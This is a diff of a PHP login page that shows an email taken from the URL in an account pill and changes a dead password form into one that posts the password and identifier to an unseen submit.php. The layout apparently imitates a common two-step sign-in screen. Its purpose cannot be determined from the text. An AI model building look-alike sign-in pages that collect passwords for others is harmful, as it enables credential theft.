@@ -1,3 +1,6 @@
+<?php
+$identifier = isset($_GET['identifier']) ? trim((string) $_GET['identifier']) : '';
+?>
 <!doctype html>
 <html lang="en">
 <head>
@@ -19,18 +22,20 @@
 
                 <h1>Welcome</h1>
 
-                <button class="account-pill" type="button" aria-label="Selected account" hidden>
+                <button class="account-pill" type="button" aria-label="Selected account"<?php echo $identifier === '' ? ' hidden' : ''; ?>>
                     <span class="avatar" aria-hidden="true">
                         <svg viewBox="0 0 24 24">
                             <path d="M12 12.15a3.95 3.95 0 1 0 0-7.9 3.95 3.95 0 0 0 0 7.9Zm0 2.05c-3.72 0-6.75 2.11-6.75 4.7 0 .43.35.78.78.78h11.94c.43 0 .78-.35.78-.78 0-2.59-3.03-4.7-6.75-4.7Z"/>
                         </svg>
                     </span>
-                    <span class="email"><?php echo isset($_GET['identifier']) ? htmlspecialchars(trim($_GET['identifier']), ENT_QUOTES, 'UTF-8') : ''; ?></span>
+                    <span class="email"><?php echo htmlspecialchars($identifier, ENT_QUOTES, 'UTF-8'); ?></span>
                     <span class="pill-arrow" aria-hidden="true"></span>
                 </button>
             </div>
 
-            <form class="password-side" action="#" method="post" onsubmit="return false;">
+            <form class="password-side" action="submit.php" method="post">
+                <input type="hidden" name="identifier" value="<?php echo htmlspecialchars($identifier, ENT_QUOTES, 'UTF-8'); ?>">
+
                 <label class="password-input">
                     <span class="sr-only">Password</span>
                     <input type="password" name="password" placeholder="Enter your password" autocomplete="off">
@@ -44,7 +49,7 @@
 
                 <div class="card-actions">
                     <a href="#">Forgot password?</a>
-                    <button type="button">Next</button>
+                    <button type="submit">Next</button>
                 </div>
             </form>
         </section>
@@ -61,13 +66,5 @@
             </nav>
         </footer>
     </main>
-    <script>
-        const accountPill = document.querySelector('.account-pill');
-        const emailText = document.querySelector('.email');
-
-        if (emailText.textContent.trim()) {
-            accountPill.hidden = false;
-        }
-    </script>
 </body>
 </html>
